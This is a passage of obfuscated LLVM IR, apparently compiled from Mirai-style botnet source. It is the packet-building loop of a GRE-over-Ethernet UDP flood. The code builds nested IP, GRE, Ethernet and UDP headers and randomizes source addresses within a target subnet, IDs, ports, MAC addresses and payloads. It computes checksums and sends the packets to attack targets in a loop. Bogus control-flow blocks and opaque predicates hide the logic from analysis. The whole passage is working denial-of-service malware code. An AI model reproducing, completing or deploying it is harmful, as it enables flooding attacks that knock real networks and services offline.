  %249 = trunc i32 %248 to i16
  %250 = call zeroext i16 @htons(i16 zeroext %249) #7
  %251 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %252 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %251, i32 0, i32 3
  store i16 %250, i16* %252, align 4
  %253 = load i8, i8* %14, align 1
  %254 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 5
  store i8 %253, i8* %255, align 4
  %256 = load i8, i8* %15, align 1
  %257 = icmp ne i8 %256, 0
  br i1 %257, label %258, label %262

; <label>:258:                                    ; preds = %206
  %259 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %260 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %261 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %260, i32 0, i32 4
  store i16 %259, i16* %261, align 2
  br label %262

; <label>:262:                                    ; preds = %258, %206
  %263 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 6
  store i8 17, i8* %264, align 1
  %265 = call i32 @rand_next()
  %266 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 8
  store i32 %265, i32* %267, align 4
  %268 = load i8, i8* %20, align 1
  %269 = icmp ne i8 %268, 0
  br i1 %269, label %270, label %276

; <label>:270:                                    ; preds = %262
  %271 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %272 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %271, i32 0, i32 9
  %273 = load i32, i32* %272, align 4
  %274 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 9
  store i32 %273, i32* %275, align 4
  br label %300

; <label>:276:                                    ; preds = %262
  %277 = load i32, i32* @x.27
  %278 = load i32, i32* @y.28
  %279 = sub i32 %277, 1
  %280 = mul i32 %277, %279
  %281 = urem i32 %280, 2
  %282 = icmp eq i32 %281, 0
  %283 = icmp slt i32 %278, 10
  %284 = or i1 %282, %283
  br i1 %284, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %276
  %285 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i32 0, i32 8
  %287 = load i32, i32* %286, align 4
  %288 = sub i32 %287, 1024
  %289 = xor i32 %288, -1
  %290 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %291 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %290, i32 0, i32 9
  store i32 %289, i32* %291, align 4
  %292 = load i32, i32* @x.27
  %293 = load i32, i32* @y.28
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart260, label %originalBB39alteredBB

originalBBpart260:                                ; preds = %originalBB39
  br label %300

; <label>:300:                                    ; preds = %originalBBpart260, %270
  %301 = load i16, i16* %16, align 2
  %302 = call zeroext i16 @htons(i16 zeroext %301) #7
  %303 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %304 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %303, i32 0, i32 0
  store i16 %302, i16* %304, align 2
  %305 = load i16, i16* %17, align 2
  %306 = call zeroext i16 @htons(i16 zeroext %305) #7
  %307 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %308 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %307, i32 0, i32 1
  store i16 %306, i16* %308, align 2
  %309 = load i32, i32* %18, align 4
  %310 = sext i32 %309 to i64
  %311 = add i64 8, %310
  %312 = trunc i64 %311 to i16
  %313 = call zeroext i16 @htons(i16 zeroext %312) #7
  %314 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %315 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %314, i32 0, i32 2
  store i16 %313, i16* %315, align 2
  br label %316

; <label>:316:                                    ; preds = %300
  %317 = load i32, i32* %9, align 4
  %318 = add nsw i32 %317, 1
  store i32 %318, i32* %9, align 4
  br label %128

; <label>:319:                                    ; preds = %128
  br label %320

; <label>:320:                                    ; preds = %599, %319
  %321 = load i32, i32* @x.27
  %322 = load i32, i32* @y.28
  %323 = sub i32 %321, 1
  %324 = mul i32 %321, %323
  %325 = urem i32 %324, 2
  %326 = icmp eq i32 %325, 0
  %327 = icmp slt i32 %322, 10
  %328 = or i1 %326, %327
  br i1 %328, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %320
  store i32 0, i32* %9, align 4
  %329 = load i32, i32* @x.27
  %330 = load i32, i32* @y.28
  %331 = sub i32 %329, 1
  %332 = mul i32 %329, %331
  %333 = urem i32 %332, 2
  %334 = icmp eq i32 %333, 0
  %335 = icmp slt i32 %330, 10
  %336 = or i1 %334, %335
  br i1 %336, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br label %337

; <label>:337:                                    ; preds = %originalBBpart279, %originalBBpart264
  %338 = load i32, i32* %9, align 4
  %339 = load i8, i8* %5, align 1
  %340 = zext i8 %339 to i32
  %341 = icmp slt i32 %338, %340
  br i1 %341, label %342, label %599

; <label>:342:                                    ; preds = %337
  %343 = load i32, i32* @x.27
  %344 = load i32, i32* @y.28
  %345 = sub i32 %343, 1
  %346 = mul i32 %343, %345
  %347 = urem i32 %346, 2
  %348 = icmp eq i32 %347, 0
  %349 = icmp slt i32 %344, 10
  %350 = or i1 %348, %349
  br i1 %350, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %342
  %351 = load i8**, i8*** %11, align 8
  %352 = load i32, i32* %9, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds i8*, i8** %351, i64 %353
  %355 = load i8*, i8** %354, align 8
  store i8* %355, i8** %30, align 8
  %356 = load i8*, i8** %30, align 8
  %357 = bitcast i8* %356 to %struct.iphdr*
  store %struct.iphdr* %357, %struct.iphdr** %31, align 8
  %358 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %359 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %358, i64 1
  %360 = bitcast %struct.iphdr* %359 to %struct.grehdr*
  store %struct.grehdr* %360, %struct.grehdr** %32, align 8
  %361 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %362 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %361, i64 1
  %363 = bitcast %struct.grehdr* %362 to %struct.ethhdr*
  store %struct.ethhdr* %363, %struct.ethhdr** %33, align 8
  %364 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %365 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %364, i64 1
  %366 = bitcast %struct.ethhdr* %365 to %struct.iphdr*
  store %struct.iphdr* %366, %struct.iphdr** %34, align 8
  %367 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i64 1
  %369 = bitcast %struct.iphdr* %368 to %struct.udphdr*
  store %struct.udphdr* %369, %struct.udphdr** %35, align 8
  %370 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %371 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %370, i64 1
  %372 = bitcast %struct.udphdr* %371 to i8*
  store i8* %372, i8** %36, align 8
  %373 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %374 = load i32, i32* %9, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i32 0, i32 2
  %378 = load i8, i8* %377, align 4
  %379 = zext i8 %378 to i32
  %380 = icmp slt i32 %379, 32
  %381 = load i32, i32* @x.27
  %382 = load i32, i32* @y.28
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %380, label %389, label %410

; <label>:389:                                    ; preds = %originalBBpart268
  %390 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %391 = load i32, i32* %9, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i64 %392
  %394 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %393, i32 0, i32 1
  %395 = load i32, i32* %394, align 4
  %396 = call i32 @ntohl(i32 %395) #7
  %397 = call i32 @rand_next()
  %398 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %399 = load i32, i32* %9, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i64 %400
  %402 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i32 0, i32 2
  %403 = load i8, i8* %402, align 4
  %404 = zext i8 %403 to i32
  %405 = lshr i32 %397, %404
  %406 = add i32 %396, %405
  %407 = call i32 @htonl(i32 %406) #7
  %408 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 9
  store i32 %407, i32* %409, align 4
  br label %410

; <label>:410:                                    ; preds = %389, %originalBBpart268
  %411 = load i32, i32* %21, align 4
  %412 = icmp eq i32 %411, -1
  br i1 %412, label %413, label %417

; <label>:413:                                    ; preds = %410
  %414 = call i32 @rand_next()
  %415 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %416 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %415, i32 0, i32 8
  store i32 %414, i32* %416, align 4
  br label %417

; <label>:417:                                    ; preds = %413, %410
  %418 = load i16, i16* %13, align 2
  %419 = zext i16 %418 to i32
  %420 = icmp eq i32 %419, 65535
  br i1 %420, label %421, label %436

; <label>:421:                                    ; preds = %417
  %422 = call i32 @rand_next()
  %423 = and i32 %422, 65535
  %424 = trunc i32 %423 to i16
  %425 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %426 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %425, i32 0, i32 3
  store i16 %424, i16* %426, align 4
  %427 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i32 0, i32 3
  %429 = load i16, i16* %428, align 4
  %430 = zext i16 %429 to i32
  %431 = sub nsw i32 %430, 1000
  %432 = xor i32 %431, -1
  %433 = trunc i32 %432 to i16
  %434 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %435 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %434, i32 0, i32 3
  store i16 %433, i16* %435, align 4
  br label %436

; <label>:436:                                    ; preds = %421, %417
  %437 = load i16, i16* %16, align 2
  %438 = zext i16 %437 to i32
  %439 = icmp eq i32 %438, 65535
  br i1 %439, label %440, label %446

; <label>:440:                                    ; preds = %436
  %441 = call i32 @rand_next()
  %442 = and i32 %441, 65535
  %443 = trunc i32 %442 to i16
  %444 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %445 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %444, i32 0, i32 0
  store i16 %443, i16* %445, align 2
  br label %446

; <label>:446:                                    ; preds = %440, %436
  %447 = load i32, i32* @x.27
  %448 = load i32, i32* @y.28
  %449 = sub i32 %447, 1
  %450 = mul i32 %447, %449
  %451 = urem i32 %450, 2
  %452 = icmp eq i32 %451, 0
  %453 = icmp slt i32 %448, 10
  %454 = or i1 %452, %453
  br i1 %454, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %446
  %455 = load i16, i16* %17, align 2
  %456 = zext i16 %455 to i32
  %457 = icmp eq i32 %456, 65535
  %458 = load i32, i32* @x.27
  %459 = load i32, i32* @y.28
  %460 = sub i32 %458, 1
  %461 = mul i32 %458, %460
  %462 = urem i32 %461, 2
  %463 = icmp eq i32 %462, 0
  %464 = icmp slt i32 %459, 10
  %465 = or i1 %463, %464
  br i1 %465, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %457, label %466, label %472

; <label>:466:                                    ; preds = %originalBBpart272
  %467 = call i32 @rand_next()
  %468 = and i32 %467, 65535
  %469 = trunc i32 %468 to i16
  %470 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %471 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %470, i32 0, i32 1
  store i16 %469, i16* %471, align 2
  br label %472

; <label>:472:                                    ; preds = %466, %originalBBpart272
  %473 = load i8, i8* %20, align 1
  %474 = icmp ne i8 %473, 0
  br i1 %474, label %479, label %475

; <label>:475:                                    ; preds = %472
  %476 = call i32 @rand_next()
  %477 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %478 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %477, i32 0, i32 9
  store i32 %476, i32* %478, align 4
  br label %485

; <label>:479:                                    ; preds = %472
  %480 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 9
  %482 = load i32, i32* %481, align 4
  %483 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %484 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %483, i32 0, i32 9
  store i32 %482, i32* %484, align 4
  br label %485

; <label>:485:                                    ; preds = %479, %475
  %486 = call i32 @rand_next()
  store i32 %486, i32* %37, align 4
  %487 = call i32 @rand_next()
  store i32 %487, i32* %38, align 4
  %488 = call i32 @rand_next()
  store i32 %488, i32* %39, align 4
  %489 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %490 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %489, i32 0, i32 0
  %491 = getelementptr inbounds [6 x i8], [6 x i8]* %490, i32 0, i32 0
  %492 = bitcast i32* %37 to i8*
  call void @util_memcpy(i8* %491, i8* %492, i32 4)
  %493 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %494 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %493, i32 0, i32 1
  %495 = getelementptr inbounds [6 x i8], [6 x i8]* %494, i32 0, i32 0
  %496 = bitcast i32* %38 to i8*
  call void @util_memcpy(i8* %495, i8* %496, i32 4)
  %497 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %498 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %497, i32 0, i32 0
  %499 = getelementptr inbounds [6 x i8], [6 x i8]* %498, i32 0, i32 0
  %500 = getelementptr inbounds i8, i8* %499, i64 4
  %501 = bitcast i32* %39 to i8*
  call void @util_memcpy(i8* %500, i8* %501, i32 2)
  %502 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %503 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %502, i32 0, i32 1
  %504 = getelementptr inbounds [6 x i8], [6 x i8]* %503, i32 0, i32 0
  %505 = getelementptr inbounds i8, i8* %504, i64 4
  %506 = bitcast i32* %39 to i8*
  %507 = getelementptr inbounds i8, i8* %506, i64 2
  call void @util_memcpy(i8* %505, i8* %507, i32 2)
  %508 = load i8, i8* %19, align 1
  %509 = icmp ne i8 %508, 0
  br i1 %509, label %510, label %513

; <label>:510:                                    ; preds = %485
  %511 = load i8*, i8** %36, align 8
  %512 = load i32, i32* %18, align 4
  call void @rand_str(i8* %511, i32 %512)
  br label %513

; <label>:513:                                    ; preds = %510, %485
  %514 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %515 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %514, i32 0, i32 7
  store i16 0, i16* %515, align 2
  %516 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %517 = bitcast %struct.iphdr* %516 to i16*
  %518 = call zeroext i16 @checksum_generic(i16* %517, i32 20)
  %519 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %520 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %519, i32 0, i32 7
  store i16 %518, i16* %520, align 2
  %521 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %522 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %521, i32 0, i32 7
  store i16 0, i16* %522, align 2
  %523 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %524 = bitcast %struct.iphdr* %523 to i16*
  %525 = call zeroext i16 @checksum_generic(i16* %524, i32 20)
  %526 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %527 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %526, i32 0, i32 7
  store i16 %525, i16* %527, align 2
  %528 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %529 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %528, i32 0, i32 3
  store i16 0, i16* %529, align 2
  %530 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %531 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %532 = bitcast %struct.udphdr* %531 to i8*
  %533 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %534 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %533, i32 0, i32 2
  %535 = load i16, i16* %534, align 2
  %536 = load i32, i32* %18, align 4
  %537 = sext i32 %536 to i64
  %538 = add i64 8, %537
  %539 = trunc i64 %538 to i32
  %540 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %530, i8* %532, i16 zeroext %535, i32 %539)
  %541 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %542 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %541, i32 0, i32 3
  store i16 %540, i16* %542, align 2
  %543 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %544 = load i32, i32* %9, align 4
  %545 = sext i32 %544 to i64
  %546 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %543, i64 %545
  %547 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %546, i32 0, i32 0
  %548 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %547, i32 0, i32 0
  store i16 2, i16* %548, align 4
  %549 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %550 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %549, i32 0, i32 9
  %551 = load i32, i32* %550, align 4
  %552 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %553 = load i32, i32* %9, align 4
  %554 = sext i32 %553 to i64
  %555 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %552, i64 %554
  %556 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %555, i32 0, i32 0
  %557 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %556, i32 0, i32 2
  %558 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %557, i32 0, i32 0
  store i32 %551, i32* %558, align 4
  %559 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %560 = load i32, i32* %9, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %559, i64 %561
  %563 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %562, i32 0, i32 0
  %564 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %563, i32 0, i32 1
  store i16 0, i16* %564, align 2
  %565 = load i32, i32* %10, align 4
  %566 = load i8*, i8** %30, align 8
  %567 = load i32, i32* %18, align 4
  %568 = sext i32 %567 to i64
  %569 = add i64 66, %568
  %570 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %571 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %572 = load i32, i32* %9, align 4
  %573 = sext i32 %572 to i64
  %574 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %571, i64 %573
  %575 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %574, i32 0, i32 0
  %576 = bitcast %struct.sockaddr_in* %575 to %struct.sockaddr*
  store %struct.sockaddr* %576, %struct.sockaddr** %570, align 8
  %577 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %578 = load %struct.sockaddr*, %struct.sockaddr** %577, align 8
  %579 = call i64 @sendto(i32 %565, i8* %566, i64 %569, i32 16384, %struct.sockaddr* %578, i32 16)
  br label %580

; <label>:580:                                    ; preds = %513
  %581 = load i32, i32* @x.27
  %582 = load i32, i32* @y.28
  %583 = sub i32 %581, 1
  %584 = mul i32 %581, %583
  %585 = urem i32 %584, 2
  %586 = icmp eq i32 %585, 0
  %587 = icmp slt i32 %582, 10
  %588 = or i1 %586, %587
  br i1 %588, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %580
  %589 = load i32, i32* %9, align 4
  %590 = add nsw i32 %589, 1
  store i32 %590, i32* %9, align 4
  %591 = load i32, i32* @x.27
  %592 = load i32, i32* @y.28
  %593 = sub i32 %591, 1
  %594 = mul i32 %591, %593
  %595 = urem i32 %594, 2
  %596 = icmp eq i32 %595, 0
  %597 = icmp slt i32 %592, 10
  %598 = or i1 %596, %597
  br i1 %598, label %originalBBpart279, label %originalBB74alteredBB

originalBBpart279:                                ; preds = %originalBB74
  br label %337

; <label>:599:                                    ; preds = %337
  br label %320

; <label>:600:                                    ; preds = %108, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %86
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %111
  store i32 0, i32* %9, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %133
  %601 = call noalias i8* @calloc(i64 1458, i64 8) #6
  %602 = load i8**, i8*** %11, align 8
  %603 = load i32, i32* %9, align 4
  %604 = sext i32 %603 to i64
  %605 = getelementptr inbounds i8*, i8** %602, i64 %604
  store i8* %601, i8** %605, align 8
  %606 = load i8**, i8*** %11, align 8
  %607 = load i32, i32* %9, align 4
  %608 = sext i32 %607 to i64
  %609 = getelementptr inbounds i8*, i8** %606, i64 %608
  %610 = load i8*, i8** %609, align 8
  %611 = bitcast i8* %610 to %struct.iphdr*
  store %struct.iphdr* %611, %struct.iphdr** %22, align 8
  %612 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %613 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %612, i64 1
  %614 = bitcast %struct.iphdr* %613 to %struct.grehdr*
  store %struct.grehdr* %614, %struct.grehdr** %23, align 8
  %615 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %616 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %615, i64 1
  %617 = bitcast %struct.grehdr* %616 to %struct.ethhdr*
  store %struct.ethhdr* %617, %struct.ethhdr** %24, align 8
  %618 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %619 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %618, i64 1
  %620 = bitcast %struct.ethhdr* %619 to %struct.iphdr*
  store %struct.iphdr* %620, %struct.iphdr** %25, align 8
  %621 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %622 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %621, i64 1
  %623 = bitcast %struct.iphdr* %622 to %struct.udphdr*
  store %struct.udphdr* %623, %struct.udphdr** %26, align 8
  %624 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %625 = bitcast %struct.iphdr* %624 to i8*
  %626 = load i8, i8* %625, align 4
  %_ = sub i8 %626, 15
  %gen = mul i8 %_, 15
  %_7 = sub i8 %626, 15
  %gen8 = mul i8 %_7, 15
  %_9 = sub i8 0, %626
  %gen10 = add i8 %_9, 15
  %627 = and i8 %626, 15
  %_11 = sub i8 0, %627
  %gen12 = add i8 %_11, 64
  %_13 = sub i8 0, %627
  %gen14 = add i8 %_13, 64
  %_15 = shl i8 %627, 64
  %_16 = sub i8 %627, 64
  %gen17 = mul i8 %_16, 64
  %_18 = shl i8 %627, 64
  %628 = or i8 %627, 64
  store i8 %628, i8* %625, align 4
  %629 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %630 = bitcast %struct.iphdr* %629 to i8*
  %631 = load i8, i8* %630, align 4
  %_19 = shl i8 %631, -16
  %_20 = sub i8 %631, -16
  %gen21 = mul i8 %_20, -16
  %_22 = sub i8 0, %631
  %gen23 = add i8 %_22, -16
  %_24 = shl i8 %631, -16
  %_25 = sub i8 %631, -16
  %gen26 = mul i8 %_25, -16
  %_27 = sub i8 0, %631
  %gen28 = add i8 %_27, -16
  %632 = and i8 %631, -16
  %_29 = sub i8 0, %632
  %gen30 = add i8 %_29, 5
  %633 = or i8 %632, 5
  store i8 %633, i8* %630, align 4
  %634 = load i8, i8* %12, align 1
  %635 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %636 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %635, i32 0, i32 1
  store i8 %634, i8* %636, align 1
  %637 = load i32, i32* %18, align 4
  %638 = sext i32 %637 to i64
  %_31 = sub i64 66, %638
  %gen32 = mul i64 %_31, %638
  %_33 = shl i64 66, %638
  %_34 = sub i64 66, %638
  %gen35 = mul i64 %_34, %638
  %639 = add i64 66, %638
  %640 = trunc i64 %639 to i16
  %641 = call zeroext i16 @htons(i16 zeroext %640) #7
  %642 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %643 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %642, i32 0, i32 2
  store i16 %641, i16* %643, align 2
  %644 = load i16, i16* %13, align 2
  %645 = call zeroext i16 @htons(i16 zeroext %644) #7
  %646 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %647 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %646, i32 0, i32 3
  store i16 %645, i16* %647, align 4
  %648 = load i8, i8* %14, align 1
  %649 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %650 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %649, i32 0, i32 5
  store i8 %648, i8* %650, align 4
  %651 = load i8, i8* %15, align 1
  %652 = icmp ne i8 %651, 0
  br label %originalBB6

originalBB39alteredBB:                            ; preds = %originalBB39, %276
  %653 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %654 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %653, i32 0, i32 8
  %655 = load i32, i32* %654, align 4
  %_40 = sub i32 0, %655
  %gen41 = add i32 %_40, 1024
  %_42 = sub i32 0, %655
  %gen43 = add i32 %_42, 1024
  %_44 = sub i32 %655, 1024
  %gen45 = mul i32 %_44, 1024
  %_46 = sub i32 %655, 1024
  %gen47 = mul i32 %_46, 1024
  %656 = sub i32 %655, 1024
  %_48 = shl i32 %656, -1
  %_49 = sub i32 0, %656
  %gen50 = add i32 %_49, -1
  %_51 = shl i32 %656, -1
  %_52 = shl i32 %656, -1
  %_53 = sub i32 %656, -1
  %gen54 = mul i32 %_53, -1
  %_55 = shl i32 %656, -1
  %_56 = sub i32 0, %656
  %gen57 = add i32 %_56, -1
  %_58 = shl i32 %656, -1
  %657 = xor i32 %656, -1
  %658 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %659 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %658, i32 0, i32 9
  store i32 %657, i32* %659, align 4
  br label %originalBB39

originalBB62alteredBB:                            ; preds = %originalBB62, %320
  store i32 0, i32* %9, align 4
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %342
  %660 = load i8**, i8*** %11, align 8
  %661 = load i32, i32* %9, align 4
  %662 = sext i32 %661 to i64
  %663 = getelementptr inbounds i8*, i8** %660, i64 %662
  %664 = load i8*, i8** %663, align 8
  store i8* %664, i8** %30, align 8
  %665 = load i8*, i8** %30, align 8
  %666 = bitcast i8* %665 to %struct.iphdr*
  store %struct.iphdr* %666, %struct.iphdr** %31, align 8
  %667 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %668 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %667, i64 1
  %669 = bitcast %struct.iphdr* %668 to %struct.grehdr*
  store %struct.grehdr* %669, %struct.grehdr** %32, align 8
  %670 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %671 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %670, i64 1
  %672 = bitcast %struct.grehdr* %671 to %struct.ethhdr*
  store %struct.ethhdr* %672, %struct.ethhdr** %33, align 8
  %673 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %674 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %673, i64 1
  %675 = bitcast %struct.ethhdr* %674 to %struct.iphdr*
  store %struct.iphdr* %675, %struct.iphdr** %34, align 8
  %676 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %677 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %676, i64 1
  %678 = bitcast %struct.iphdr* %677 to %struct.udphdr*
  store %struct.udphdr* %678, %struct.udphdr** %35, align 8
  %679 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %680 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %679, i64 1
  %681 = bitcast %struct.udphdr* %680 to i8*
  store i8* %681, i8** %36, align 8
  %682 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %683 = load i32, i32* %9, align 4
  %684 = sext i32 %683 to i64
  %685 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %682, i64 %684
  %686 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %685, i32 0, i32 2
  %687 = load i8, i8* %686, align 4
  %688 = zext i8 %687 to i32
  %689 = icmp slt i32 %688, 32
  br label %originalBB66

